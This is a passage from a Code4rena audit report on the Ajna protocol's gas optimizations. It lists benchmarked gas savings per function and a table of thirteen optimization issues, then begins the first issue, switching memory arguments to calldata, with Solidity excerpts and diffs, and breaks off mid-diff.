href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/349\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/332\">patitonar</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/318\">Raihan</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/315\">ReyAdmirado</a>, [hunter\\</em>w3b](<a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/302\">https://github.com/code-423n4/2023-05-ajna-findings/issues/302</a>), <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/267\">kaveyjoe</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/249\">SAAJ</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/245\">Audit_Avengers</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/216\">Blckhv</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/210\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/163\">K42</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/137\">codeslide</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/29\">Eurovickk</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/13\">dicethedev</a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/5\">okolicodes</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<p>A majority of the optimizations were benchmarked via the protocol’s tests, i.e. using the following config for <code>ajna-core</code>: <code>solc version 0.8.14</code>, <code>optimizer on</code>, <code>500 runs</code> and the following config for <code>ajna-grants</code>: <code>solc version 0.8.16</code>, <code>optimizer on</code>, <code>1000000 runs</code>. Optimizations that were not benchmarked are explained via EVM gas costs and opcodes.</p>\n<p>Below are the overall average gas savings for the following tested functions, with all the optimizations applied (not including G-11, G-12, and G-14):\n| Function |    Before   |    After   | Avg Gas Savings |\n| ------ | -------- | -------- | ------- |\n| GrantFund.claimDelegateReward |  65340  |  42268  | 23072 |\n| GrantFund.executeExtraordinary |  95823  |  95682  | 141 |\n| GrantFund.executeStandard |  47894  |  47520  | 374 |\n| GrantFund.fundTreasury |  65872  |  65788  | 84 |\n| GrantFund.fundingVote |  409345  |  396776  | 12569 |\n| GrantFund.proposeExtraordinary |  86505  |  86451  | 54 |\n| GrantFund.proposeStandard |  82900  |  82820  | 80 |\n| GrantFund.screeningVote |  399146  |  390626  | 8520 |\n| GrantFund.startNewDistributionPeriod |  75597  |  75139  | 458 |\n| GrantFund.updateSlate |  318329  |  310231  | 8098 |\n| GrantFund.voteExtraordinary |  31424  |  30811  | 613 |\n| PositionManager.burn |  10451  |  8524  | 1927 |\n| PositionManager.memorializePositions |  1134444  |  1133268  | 1176 |\n| PositionManager.mint |  98876  |  97653  | 1223 |\n| PositionManager.permit |  54387  |  32554  | 21833 |\n| RewardsManager.claimRewards |  393064  |  381560  | 11504 |\n| RewardsManager.moveStakedLiquidity |  2112272  |  2081035  | 31237 | </p>\n<p><strong>Total gas saved across all listed functions: 122963</strong></p>\n<p><em>Notes</em>: </p>\n<ul>\n<li>The <code>Avg</code>, <code>Med</code>, and <code># of calls</code> differs between each test since fuzzing it used. Therefore, we will examine the differences in the <code>Max</code> column, which stays the same, in order to calculate the gas difference.</li>\n<li>The Gas report output, after all optimizations have been applied, can be found at the end of the report.</li>\n<li>The final diffs for each contract, with all the optimizations applied, can be found <a href=\"https://gist.github.com/0xJCN/f01a24cd9e0996a1a36913cba06688a2\">here</a>.</li>\n</ul>\n<h2 id=\"gas-optimizations-1\" style=\"position:relative;\"><a href=\"#gas-optimizations-1\" aria-label=\"gas optimizations 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h2>\n<table>\n<thead>\n<tr>\n<th>Number</th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G-01]</td>\n<td align=\"left\">Use calldata instead of memory for function arguments that do not get mutated</td>\n<td align=\"center\">19</td>\n</tr>\n<tr>\n<td>[G-02]</td>\n<td align=\"left\">State variables can be cached instead of re-reading them from storage</td>\n<td align=\"center\">6</td>\n</tr>\n<tr>\n<td>[G-03]</td>\n<td align=\"left\">Refactor internal function to avoid unnecessary SLOAD</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[G-04]</td>\n<td align=\"left\">Using storage instead of memory for structs/arrays saves gas</td>\n<td align=\"center\">11</td>\n</tr>\n<tr>\n<td>[G-05]</td>\n<td align=\"left\">Avoid emitting storage values</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[G-06]</td>\n<td align=\"left\">Multiple accesses of a mapping/array should use a storage pointer</td>\n<td align=\"center\">14</td>\n</tr>\n<tr>\n<td>[G-07]</td>\n<td align=\"left\">Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate</td>\n<td align=\"center\">3</td>\n</tr>\n<tr>\n<td>[G-08]</td>\n<td align=\"left\">Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[G-09]</td>\n<td align=\"left\">Use <code>do while</code> loops instead of <code>for</code> loops</td>\n<td align=\"center\">14</td>\n</tr>\n<tr>\n<td>[G-10]</td>\n<td align=\"left\">Use assembly to perform efficient back-to-back calls</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[G-11]</td>\n<td align=\"left\">Refactor event to avoid emitting data that is already present in transaction data</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[G-12]</td>\n<td align=\"left\">Refactor event to avoid emitting empty data</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td>[G-13]</td>\n<td align=\"left\">Sort array offchain to check duplicates in O(n) instead of O(n^2)</td>\n<td align=\"center\">1</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"g-01-use-calldata-instead-of-memory-for-function-arguments-that-do-not-get-mutated\" style=\"position:relative;\"><a href=\"#g-01-use-calldata-instead-of-memory-for-function-arguments-that-do-not-get-mutated\" aria-label=\"g 01 use calldata instead of memory for function arguments that do not get mutated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Use calldata instead of memory for function arguments that do not get mutated</h2>\n<p>When you specify a data location as <code>memory</code>, that value will be copied into memory. When you specify the location as <code>calldata</code>, the value will stay static within calldata. If the value is a large, complex type, using <code>memory</code> may result in extra memory expansion costs.</p>\n<p><strong>Note: We are not able to change <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L152-L157\"><code>_hashProposals</code></a> , <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L103-L107\"><code>_validateCallDatas</code></a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L90\"><code>proposeExtraordinary</code></a> to take <code>calldata</code> arguments due to <code>stack too deep</code> errors.</strong></p>\n<p>Total Instances: <code>19</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L135-L140\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L135-L140</a></p>\n<p><em>Gas Savings for <code>RewardsManager.moveStakedLiquidity</code>, obtained via protocol’s tests: Avg 1195 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>2112272</td>\n</tr>\n<tr>\n<td>After</td>\n<td>2111077</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">moveStakedLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">136:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">137:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">fromBuckets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">138:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">toBuckets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">139:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">expiry_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..2e263b4 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -134,8 +134,8 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function moveStakedLiquidity(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 tokenId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256[] memory fromBuckets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256[] memory toBuckets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] calldata fromBuckets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] calldata toBuckets_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 expiry_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external nonReentrant override {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         StakeInfo storage stakeInfo = stakes[tokenId_];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -147,16 +147,18 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (fromBucketLength != toBuckets_.length) revert MoveStakedLiquidityInvalid();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address ajnaPool = stakeInfo.ajnaPool;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 curBurnEpoch = IPool(ajnaPool).currentBurnEpoch();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        { // to fix `stack too deep` error</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 curBurnEpoch = IPool(ajnaPool).currentBurnEpoch();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // claim rewards before moving liquidity, if any</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        _claimRewards(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            stakeInfo,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            tokenId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            curBurnEpoch,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            false,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ajnaPool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // claim rewards before moving liquidity, if any</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            _claimRewards(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                stakeInfo,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                tokenId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                curBurnEpoch,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                false,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                ajnaPool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 fromIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 toIndex;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L521\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L521</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612-L618\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612-L618</a></p>\n<p><em>Gas Savings for <code>GrantFund.fundingVote</code>, obtained via protocol’s tests: Avg 1589 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>409345</td>\n</tr>\n<tr>\n<td>After</td>\n<td>407756</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">519</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fundingVote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">520:        </span><span class=\"mtk10\">FundingVoteParams</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">521</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">612</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_fundingVote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">613:        </span><span class=\"mtk10\">QuarterlyDistribution</span><span class=\"mtk1\"> </span><span class=\"mtk10\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk10\">currentDistribution_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">614:        </span><span class=\"mtk10\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk10\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk10\">proposal_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">615:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">account_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">616:        </span><span class=\"mtk10\">QuadraticVoter</span><span class=\"mtk1\"> </span><span class=\"mtk10\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk10\">voter_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">617:        </span><span class=\"mtk10\">FundingVoteParams</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">618</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incrementalVotesUsed_</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"120\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..88f37a0 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -517,31 +517,33 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IStandardFunding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function fundingVote(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        FundingVoteParams[] memory voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        FundingVoteParams[] calldata voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) external override returns (uint256 votesCast_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint24 currentDistributionId = _currentDistributionId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         QuarterlyDistribution storage currentDistribution = _distributions[currentDistributionId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         QuadraticVoter        storage voter               = _quadraticVoters[currentDistributionId][msg.sender];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 endBlock = currentDistribution.endBlock;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        { // @audit: needed to fix `stack too deep` error</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 endBlock = currentDistribution.endBlock;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 screeningStageEndBlock = _getScreeningStageEndBlock(endBlock);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 screeningStageEndBlock = _getScreeningStageEndBlock(endBlock);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // check that the funding stage is active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (block.number &lt;= screeningStageEndBlock || block.number &gt; endBlock) revert InvalidVote();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // check that the funding stage is active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (block.number &lt;= screeningStageEndBlock || block.number &gt; endBlock) revert InvalidVote();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint128 votingPower = voter.votingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint128 votingPower = voter.votingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // if this is the first time a voter has attempted to vote this period,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        // set initial voting power and remaining voting power</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (votingPower == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // if this is the first time a voter has attempted to vote this period,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            // set initial voting power and remaining voting power</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (votingPower == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            // calculate the voting power available to the voting power in this funding stage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint128 newVotingPower = SafeCast.toUint128(_getVotesFunding(msg.sender, votingPower, voter.remainingVotingPower, screeningStageEndBlock));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                // calculate the voting power available to the voting power in this funding stage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                uint128 newVotingPower = SafeCast.toUint128(_getVotesFunding(msg.sender, votingPower, voter.remainingVotingPower, screeningStageEndBlock));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            voter.votingPower          = newVotingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            voter.remainingVotingPower = newVotingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                voter.votingPower          = newVotingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                voter.remainingVotingPower = newVotingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 numVotesCast = voteParams_.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -614,7 +616,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         Proposal storage proposal_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address account_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         QuadraticVoter storage voter_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        FundingVoteParams memory voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 